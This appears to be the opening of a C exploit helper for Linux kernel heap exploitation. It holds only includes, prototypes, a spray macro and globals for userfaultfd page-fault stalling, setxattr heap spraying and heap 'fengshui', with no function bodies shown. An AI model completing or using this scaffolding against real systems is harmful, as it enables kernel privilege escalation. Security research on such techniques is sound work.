#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <poll.h>

static int init_userfaultfd(void *addr);
static void *init_pages();
static void *fault_handler_thread(void *arg);
static void *spray(void* arg);
static void *spray_setxattr(void *arg);
static void fork_and_spray(int round, int objs_each_round);
static void init_heap_spray(int _objectSize, char* _payload, int _payloadSize);
static void do_heap_fengshui(int loop);
static void do_free(int num);


#define do_spray(round) \
    fork_and_spray(round, 1); \
    sleep(1);

static size_t objectSize = 0;
static size_t payloadSize = 0;
static char *payload = NULL;